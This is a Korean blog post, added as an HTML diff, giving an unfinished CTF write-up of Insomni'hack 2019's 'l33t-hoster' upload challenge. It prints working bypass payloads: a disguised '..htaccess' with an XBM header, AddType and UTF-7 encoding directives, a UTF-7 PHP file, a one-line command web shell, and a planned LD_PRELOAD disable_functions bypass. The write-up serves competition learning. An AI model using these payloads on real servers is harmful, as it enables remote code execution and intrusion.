@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html class="no-js">
+  <head>
+	<meta charset="utf-8">
+	<title>[Insomni'hack 2019] l33t-hoster Write up(미완성) | mingzzi</title>
+	<meta name="description" content="이번에는 Insomni'hack teaser에 출제 된 l33t-hoster 문제의 풀이를 적어보려 한다.공교롭게도 문제를 풀다가 서버가 닫혀버려서 끝까지 풀진 못했다. ㅠㅠ">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<!-- CSS -->
+	<link rel="stylesheet" href="/assets/css/main.css">
+
+	<!--Favicon-->
+	<link rel="shortcut icon" href="/assets/favicon.ico" type="image/x-icon">
+
+	<!-- Canonical -->
+	<link rel="canonical" href="/ctf/2019/2019/01/24/ctf-insomnihack2019-l33t-hoster.html">
+
+	<!-- RSS -->
+	<link rel="alternate" type="application/atom+xml" title="mingzzi" href="/feed.xml" />
+
+	<!-- Font Awesome -->
+	<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+	<!-- Google Fonts -->
+	
+	<link href="https://fonts.googleapis.com/css?family=Nanum+Gothic:400,700" rel="stylesheet">
+	
+
+	<!-- KaTeX -->
+	
+	<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.css">
+	<script src="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.js"></script>
+	
+
+	<!-- Google Analytics -->
+	
+	<script>
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+	ga('create', 'UA-130304424-1', 'auto');
+	ga('send', 'pageview');
+	</script>
+	
+</head>
+
+  <header class="site-header">
+	<div class="branding">
+		
+		<a href="/">
+			<img class="avatar" src="/assets/img/blogmark.png" alt=""/>
+		</a>
+		
+		<h1 class="site-title">
+			<a href="/">mingzzi</a>
+		</h1>
+		<nav class="site-nav">
+				<ul>
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+							<li>
+								<a class="page-link" href="/about/">
+									About
+								</a>
+							</li>
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+							<li>
+								<a class="page-link" href="/tags.html">
+									tags
+								</a>
+							</li>
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+
+					<!-- Search bar -->
+					
+					<li>
+					<form action="/search.html" method="get">
+						<input type="text" id="search-box" name="query" placeholder="Search" class="">
+						<button type="submit" class="">
+							<i class="fa fa-fw fa-search"></i>
+						</button>
+					</form>
+					</li>
+					
+				</ul>
+		</nav>
+	</div>
+
+	<div class="site-category">
+			<ul class='cat1'>
+				<li><a href="/">Home</a></li>
+				<li><a href="/">Pentesting</a>
+					<ul>
+						<li><a href="/Pentest/iOS">iOS</a></li>
+						<li><a href="/Pentest/Android">Android</a></li>
+						<li><a href="/Pentest/PWeb">Web</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Wargame</a>
+					<ul>
+						<li><a href="/Wargame/LoS">Load of SQL Injection</a></li>
+						<li><a href="/Wargame/Pwnkr">Pwnable.kr</a></li>
+						<li><a href="/Wargame/Warkr">Wargame.kr</a></li>
+						<li><a href="/Wargame/XG">XSS Game</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">CTF</a>
+					<ul>
+						<li><a href="/CTF/2018">2018</a></li>
+						<li><a href="/CTF/2019">2019</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Error</a>
+					<ul>
+						<li><a href="/Error/Linux">Linux</a></li>
+						<li><a href="/Error/Python">Python</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Development</a>
+					<ul>
+						<li><a href="/Develop/Database">Database</a></li>
+						<li><a href="/Develop/Blog">Github Blog</a></li>
+						<li><a href="/Develop/DWeb">Web</a></li>
+						<li><a href="/Develop/Docker">Docker</a></li>
+						<li><a href="/Develop/Basic">Basic</a></li>
+					</ul>
+				</li>
+			</ul>
+		</div>
+
+</header>
+
+  <body>
+    <div class="content">
+      <article >
+  <header style="background-image: url('/')">
+    <h1 class="title">[Insomni'hack 2019] l33t-hoster Write up(미완성)</h1>
+    
+    <p class="meta">
+      January 24, 2019
+      
+    </p>
+  </header>
+  <section class="post-content"><p>이번에는 <code class="highlighter-rouge">Insomni'hack teaser</code>에 출제 된 <code class="highlighter-rouge">l33t-hoster</code> 문제의 풀이를 적어보려 한다.</p>
+
+<p>공교롭게도 문제를 풀다가 서버가 닫혀버려서 끝까지 풀진 못했다. ㅠㅠ</p>
+
+<!--more-->
+
+<p>문제 정보는 다음과 같다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You can host your l33t pictures here.
+</code></pre></div></div>
+
+<p>홈페이지에 접속하면 아래와 같이 파일을 올릴 수 있는 페이지를 확인할 수 있다.</p>
+
+<p><img src="/images/CTF/insomnihack2019/l33t-hoster/l33t_01.png" alt="" /></p>
+
+<p>파일 업로드를 하라고 하니 딱 웹 쉘 같은 것을 업로드 해야 할 것 같은 느낌이다.</p>
+
+<p>그런데 소스코드를 확인 해 보면 아래에 주석으로 <code class="highlighter-rouge">/?source</code>라고 적힌 부분이 있다.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h3&gt;</span>Your <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">images/a5d610a9bfe3775f2234f376f58a0cc404663bae/</span><span class="nt">&gt;</span>files<span class="nt">&lt;/a&gt;</span>:<span class="nt">&lt;/h3&gt;&lt;ul&gt;&lt;/ul&gt;</span>
+<span class="nt">&lt;h1&gt;</span>Upload your pics!<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">action=</span><span class="s">"?"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">name=</span><span class="s">"image"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">name=</span><span class="s">upload</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+<span class="c">&lt;!-- /?source --&gt;</span>
+</code></pre></div></div>
+
+<p>친절하게 소스코드를 제공 해 주었다.</p>
+
+<p>소스코드는 다음과 같았다.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"source"</span><span class="p">]))</span> 
+    <span class="k">die</span><span class="p">(</span><span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">));</span>
+
+<span class="nb">session_start</span><span class="p">();</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"home"</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"home"</span><span class="p">]</span> <span class="o">=</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nb">random_bytes</span><span class="p">(</span><span class="mi">20</span><span class="p">));</span>
+<span class="p">}</span>
+<span class="nv">$userdir</span> <span class="o">=</span> <span class="s2">"images/</span><span class="si">{</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"home"</span><span class="p">]</span><span class="si">}</span><span class="s2">/"</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$userdir</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$userdir</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="nv">$disallowed_ext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+    <span class="s2">"php"</span><span class="p">,</span>
+    <span class="s2">"php3"</span><span class="p">,</span>
+    <span class="s2">"php4"</span><span class="p">,</span>
+    <span class="s2">"php5"</span><span class="p">,</span>
+    <span class="s2">"php7"</span><span class="p">,</span>
+    <span class="s2">"pht"</span><span class="p">,</span>
+    <span class="s2">"phtm"</span><span class="p">,</span>
+    <span class="s2">"phtml"</span><span class="p">,</span>
+    <span class="s2">"phar"</span><span class="p">,</span>
+    <span class="s2">"phps"</span><span class="p">,</span>
+<span class="p">);</span>
+
+
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"upload"</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'image'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">]</span> <span class="o">!==</span> <span class="nx">UPLOAD_ERR_OK</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"yuuuge fail"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="nv">$tmp_name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"image"</span><span class="p">][</span><span class="s2">"tmp_name"</span><span class="p">];</span>
+    <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"image"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">];</span>
+    <span class="nv">$parts</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"."</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
+    <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">array_pop</span><span class="p">(</span><span class="nv">$parts</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="nb">array_shift</span><span class="p">(</span><span class="nv">$parts</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$parts</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"lol filename is empty"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span> <span class="nv">$disallowed_ext</span><span class="p">,</span> <span class="k">TRUE</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"lol nice try, but im not stupid dude..."</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="nv">$image</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$tmp_name</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">mb_strpos</span><span class="p">(</span><span class="nv">$image</span><span class="p">,</span> <span class="s2">"&lt;?"</span><span class="p">)</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"why would you need php in a pic....."</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">exif_imagetype</span><span class="p">(</span><span class="nv">$tmp_name</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"not an image."</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="nv">$image_size</span> <span class="o">=</span> <span class="nb">getimagesize</span><span class="p">(</span><span class="nv">$tmp_name</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$image_size</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">1337</span> <span class="o">||</span> <span class="nv">$image_size</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">1337</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"lol noob, your pic is not l33t enough"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="nv">$name</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">"."</span><span class="p">,</span> <span class="nv">$parts</span><span class="p">);</span>
+    <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$tmp_name</span><span class="p">,</span> <span class="nv">$userdir</span> <span class="o">.</span> <span class="nv">$name</span> <span class="o">.</span> <span class="s2">"."</span> <span class="o">.</span> <span class="nv">$ext</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">echo</span> <span class="s2">"&lt;h3&gt;Your &lt;a href=</span><span class="nv">$userdir</span><span class="s2">&gt;files&lt;/a&gt;:&lt;/h3&gt;&lt;ul&gt;"</span><span class="p">;</span>
+<span class="k">foreach</span><span class="p">(</span><span class="nb">glob</span><span class="p">(</span><span class="nv">$userdir</span> <span class="o">.</span> <span class="s2">"*"</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"&lt;li&gt;&lt;a href='</span><span class="nv">$file</span><span class="s2">'&gt;</span><span class="nv">$file</span><span class="s2">&lt;/a&gt;&lt;/li&gt;"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">echo</span> <span class="s2">"&lt;/ul&gt;"</span><span class="p">;</span>
+
+<span class="cp">?&gt;</span>
+
+<span class="nt">&lt;h1&gt;</span>Upload your pics!<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">action=</span><span class="s">"?"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">name=</span><span class="s">"image"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">name=</span><span class="s">upload</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+<span class="c">&lt;!-- /?source --&gt;</span>
+</code></pre></div></div>
+
+<p>파일을 업로드 할 수 있긴 한데 제약조건이 너무 많다.</p>
+
+<p>정리 해 보면 다음과 같다.</p>
+
+<ul>
+  <li>파일 명에서 . 앞에 아무런 문자도 없으면 안된다. 즉, .htaccess는 . 뒤의 부분만 있기 때문에 업로드 할 수 없다.</li>
+  <li><code class="highlighter-rouge">$disallowed_ext</code>에 있는 확장자는 업로드 할 수 없다.</li>
+  <li>파일의 내용에는 <code class="highlighter-rouge">&lt;?</code>가 들어있을 수 없다.</li>
+  <li>업로드 한 파일은 <code class="highlighter-rouge">exif_imagetype</code> 함수에서 검사하는 이미지 형식 중 하나여야 한다.</li>
+  <li>업로드 한 파일의 가로, 세로 크기는 1337이어야 한다.</li>
+</ul>
+
+<p>이 모든 조건을 통과하면 <code class="highlighter-rouge">images/RANDOM_BYTES/FILENAME.EXT</code>의 경로에 파일이 업로드 된다.</p>
+
+<p>그럼 일단 파일 업로드 기능이 있으므로 <code class="highlighter-rouge">RCE(Remote Code Execution)</code>을 하기 위해 <code class="highlighter-rouge">php</code> 파일을 업로드 하면 문제를 쫘라락 풀 수 있을 것 같다.</p>
+
+<p>그런데 <code class="highlighter-rouge">php</code> 확장자를 비롯해서 php 코드를 실행할 수 있는 거의 모든 확장자(일단 내가 생각할 땐 전부인 것 같은데, 혹시 어디서 뭐가 나올지 모르므로 <code class="highlighter-rouge">거의 모든</code>이라고 쓴다.)는 <code class="highlighter-rouge">$disallowed_ext</code> 변수 안에 들어있다.</p>
+
+<p>그렇다면 다른 확장자를 업로드 하더라도 <code class="highlighter-rouge">php</code>가 실행할 수 있도록 만들면 될 것 같다 ㅎㅎ</p>
+
+<p>이를 위해서 <code class="highlighter-rouge">.htaccess</code>를 업로드 해야한다.</p>
+
+<p>그런데 앞서 말했듯이, <code class="highlighter-rouge">.</code> 앞에 아무런 문자도 없다면 업로드 할 수 없다.</p>
+
+<p>이에 소스코드를 다시 살펴보면 아래와 같은 부분을 확인할 수 있다.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nv">$parts</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"."</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
+    <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">array_pop</span><span class="p">(</span><span class="nv">$parts</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="nb">array_shift</span><span class="p">(</span><span class="nv">$parts</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>즉, 만약에 파일 명을 <code class="highlighter-rouge">..htaccess</code>라고 하면, <code class="highlighter-rouge">array_shift</code> 한 결과가 아래와 같이 나온다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Array
+(
+    [0] =&gt; 
+)
+</code></pre></div></div>
+
+<p>때문에 <code class="highlighter-rouge">count($parts)</code>는 1이 되어 <code class="highlighter-rouge">if(count($parts) === 0)</code> 부분을 그냥 지나쳐갈 수 있다.</p>
+
+<p>또한 파일을 업로드 할 때, <code class="highlighter-rouge">$name.".".$ext</code> 형태로 하는데, <code class="highlighter-rouge">$name</code>은 <code class="highlighter-rouge">$_FILES["image"]["name"];</code>이기 때문에 빈 값이 될 것이고, <code class="highlighter-rouge">$ext</code>는 <code class="highlighter-rouge">array_pop($parts);</code>이기 때문에 <code class="highlighter-rouge">$parts</code>의 마지막 값인 <code class="highlighter-rouge">htaccess</code>가 되어 최종적으로 <code class="highlighter-rouge">.htaccess</code>의 이름으로 업로드 될 것이다.</p>
+
+<p>그러면 이제 아래와 같이 <code class="highlighter-rouge">.htaccess</code> 파일을 구성하여 업로드 하면, 내가 원하는 <code class="highlighter-rouge">aaa</code>라는 확장자를 <code class="highlighter-rouge">php</code>로 실행시킬 수 있게 될 것이다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AddType application/x-httpd-php .aaa
+</code></pre></div></div>
+
+<p>그런데 한가지 더 문제가 있었다.</p>
+
+<p>바로 위의 파일을 업로드 했을 때, <code class="highlighter-rouge">exif_imagetype()</code>를 통과한 결과 유효한 이미지의 값을 반환 해 주어야 한다는 것이다.</p>
+
+<p>그렇다면 파일의 헤더를 이미지 파일처럼 맞춰주면 될 것 같은데, 지금 업로드 하는 파일은 <code class="highlighter-rouge">.htaccess</code>로 사용되어야 하기 때문에 <code class="highlighter-rouge">.htaccess</code>을 해석할 때는 무시될 수 있는 이미지 파일 헤더를 찾아야 한다.</p>
+
+<p>일단 <code class="highlighter-rouge">exif_imagetype()</code> 함수에서 유효한 이미지로 취급하는 형태는 <a href="http://php.net/manual/en/function.exif-imagetype.php">여기</a>에서 확인할 수 있다.</p>
+
+<p>익숙한 형태가 보이는데 그 중, <code class="highlighter-rouge">IMAGETYPE_XBM</code>를 <a href="https://en.wikipedia.org/wiki/X_BitMap#Format">위키피디아</a>에서 찾아보면 아래와 같은 부분을 확인할 수 있다.</p>
+
+<h3 id="format">Format</h3>
+<p>XBM files differ markedly from most image files in that they take the form of C source files. This means that they can be compiled directly into an application without any preprocessing steps, but it also makes them far larger than their raw pixel data. The image data is encoded as a comma-separated list of byte values, each written in the C hexadecimal notation, ‘0x13’ for example, so that multiple ASCII characters are used to express a single byte of image information.[4]</p>
+
+<p>XBM data consists of a series of static unsigned char arrays containing the monochrome pixel data. When the format was in common use, an XBM typically appeared in headers (.h files) which featured one array per image stored in the header. The following piece of C code exemplifies an XBM file:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#define test_width 16
+#define test_height 7
+static char test_bits[] = {
+0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,
+0x00, 0x60 };
+</code></pre></div></div>
+
+<p>즉, 파일의 시작은 <code class="highlighter-rouge">#</code>으로 시작하며, 내가 파일의 <code class="highlighter-rouge">width</code>와 <code class="highlighter-rouge">height</code>도 설정할 수 있다.</p>
+
+<p>그런데 <code class="highlighter-rouge">#</code> 뒤의 문자열은 <code class="highlighter-rouge">.htaccess</code>에서 주석으로 해석한다.</p>
+
+<p>따라서 <code class="highlighter-rouge">.htaccess</code> 파일 상단에 <code class="highlighter-rouge">xbm</code> 파일처럼 <code class="highlighter-rouge">width</code>와 <code class="highlighter-rouge">height</code>의 크기를 설정 해 준다면, <code class="highlighter-rouge">exif_imagetype()</code>도 통과하고, 마지막에 이미지의 가로와 세로의 길이가 <code class="highlighter-rouge">1337</code> 이어야 하는 조건문을 통과하면서 <code class="highlighter-rouge">.htaccess</code>에서는 해당 줄을 주석으로 처리 해 무시하게 될 것이다.</p>
+
+<p>이 내용들을 바탕으로 다시 <code class="highlighter-rouge">.htaccess</code> 파일의 내용을 구성하면 다음과 같다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#define test_width 1337
+#define test_height 1337
+
+AddType application/x-httpd-php .aaa
+</code></pre></div></div>
+
+<p>다 된 것 같았는데 또 하나의 문제점이 있었다.</p>
+
+<p>바로 <code class="highlighter-rouge">&lt;?</code>를 사용할 수 없다는 점이었다.</p>
+
+<p>그래서 <code class="highlighter-rouge">.htaccess</code>에 대해서 검색하다가 인터넷에서 <a href="https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet">htaccess 치트엔진</a>을 찾을 수 있었다.</p>
+
+<p>나는 여기에서 아래와 같은 부분을 사용하기로 했다.</p>
+
+<p><img src="/images/CTF/insomnihack2019/l33t-hoster/l33t_02.png" alt="" /></p>
+
+<p>그래서 변경 한 <code class="highlighter-rouge">.htaccess</code>는 다음과 같다.</p>
+
+<ul>
+  <li>.htaccess (업로드 할 때는 ..htaccess)
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#define test_width 1337
+#define test_height 1337
+AddType application/x-httpd-php .aaa
+php_flag zend.multibyte 1
+php_value zend.script_encoding "UTF-7"
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>그럼 이제 새로운 <code class="highlighter-rouge">.aaa</code> 파일을 업로드 하는데, 코드의 내용을 <code class="highlighter-rouge">UTF-7</code>로 인코딩 해 업로드 하면 아마 자동으로 <code class="highlighter-rouge">UTF-7</code> 디코딩을 하여 실행할 수 있을 것이다.</p>
+
+<p><code class="highlighter-rouge">code.aaa</code>라는 파일을 아래와 같이 만들었다.</p>
+
+<ul>
+  <li>code.aaa (원본)
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#define test_width 1337
+#define test_height 1337
+&lt;? phpinfo();
+</code></pre></div>    </div>
+  </li>
+  <li>code.aaa (UTF-7 버전)
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#define test_width 1337
+#define test_height 1337
++ADw?php phpinfo()+ADs-
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p><code class="highlighter-rouge">UTF-7 인코딩</code>은 <a href="http://toolswebtop.com/text/process/encode/utf-7">여기</a>에서 했다.</p>
+
+<p>파일 두개를 업로드 한 결과 아래와 같이 드디어 <code class="highlighter-rouge">phpinfo()</code>를 실행할 수 있었다!</p>
+
+<p><img src="/images/CTF/insomnihack2019/l33t-hoster/l33t_03.png" alt="" /></p>
+
+<p>그래서 그냥 <code class="highlighter-rouge">code.aaa</code>에 <code class="highlighter-rouge"><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span></code>를 넣으면 되지 않을까 했는데 안되더라…</p>
+
+<p><code class="highlighter-rouge">phpinfo()</code>에서 다시 보니까 <code class="highlighter-rouge">disable_functions</code>에 <code class="highlighter-rouge">system</code> 부터 시작해서 코드를 실행할 수 있는 함수들이 다 들어가있다. (눙물…)</p>
+
+<p><img src="/images/CTF/insomnihack2019/l33t-hoster/l33t_04.png" alt="" /></p>
+
+<p>그래서 인터넷을 뒤지다 한 가지 방법을 찾았는데, 바로 <code class="highlighter-rouge">mail()</code> 함수와 <code class="highlighter-rouge">putenv()</code> 함수를 이용 해 <code class="highlighter-rouge">.so</code> 파일을 업로드 하여 실행시키는 것이다.</p>
+
+<p><a href="https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/">How to bypass disable_functions and open_basedir</a></p>
+
+<p>같은 내용인데 중국어로 적힌 <a href="https://www.freebuf.com/articles/web/192052.html">블로그 글</a>도 있었다. 여기가 소스코드는 더 깔끔하게 있는 것 같다.</p>
+
+<p><code class="highlighter-rouge">php</code>에서 <code class="highlighter-rouge">mail()</code> 함수를 실행할 때, <code class="highlighter-rouge">execve</code> 함수를 호출한다고 한다.</p>
+
+<p>때문에 내가 만약 <code class="highlighter-rouge">.so</code> 파일을 업로드 하고, <code class="highlighter-rouge">putenv()</code>를 통해 <code class="highlighter-rouge">LD_PRELOAD</code>를 내가 업로드 한 <code class="highlighter-rouge">.so</code> 파일로 변경할 수 있다면, 원하는 명령어를 실행할 수 있게 된다.</p>
+
+<p>근데… 여기까지 하고 급한 일을 해결하고 보니 서버가 닫혔다… ㅠㅠ</p>
+
+<p>그냥 급한 일을 미뤄두고 문제부터 풀 걸 그랬다 ㅠㅠ</p>
+
+<p>만약 나중에 기회가 된다면 이 내용을 실습해서 따로 올리는 것으로 하고 이 Write up은 여기까지만 해야할 것 같다.</p>
+</section>
+  
+<footer>
+  <div class="tags">
+    
+    <a class="tag" href="/tags#Write-up">#Write-up</a>
+    
+    <a class="tag" href="/tags#CTF">#CTF</a>
+    
+    <a class="tag" href="/tags#insomnihack2019">#insomnihack2019</a>
+    
+  </div>
+</footer>
+
+
+</article>
+<!-- Disqus -->
+<a href="https://devYurim.github.io/ctf/2019/2019/01/24/ctf-insomnihack2019-l33t-hoster.html#disqus_thread"></a>
+
+<div class="comments">
+  
+<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://https-devyurim-github-io-1.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                            
+
+</div>
+
+
+<!-- Post navigation -->
+
+  <div id="post-nav">
+  
+  <div id="previous-post" class="post-nav-post">
+      <p>Previous post</p>
+      <a href="/ctf/2018/2018/12/30/ctf-35c3ctf2018-php.html">
+        [35C3 CTF 2018] php Write up
+      </a>
+  </div>
+  
+  
+  <div id="next-post" class="post-nav-post">
+      <p>Next post</p>
+      <a href="/wargame/wargame.kr/2019/02/08/wargame.kr-DB_is_really_GOOD.html">
+        [Wargame.kr] DB is really GOOD 문제풀이
+      </a>
+  </div>
+  
+</div>
+
+
+
+    </div>
+    
+<script src="/assets/js/katex_init.js"></script>
+
+
+
+<footer class="site-footer">
+	<p class="text">Powered by <a href="https://jekyllrb.com/">Jekyll</a> with <a href="https://github.com/rohanchandra/type-theme">Type Theme</a>
+</p>
+</footer>
+
+
+    <script id="dsq-count-scr" src="//.disqus.com/count.js" async></script>
+
+    <!-- Google Analytics Tracking code -->
+<script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', '']);
+    _gaq.push(['_trackPageview']);
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+</script>
+
+  </body>
+</html>
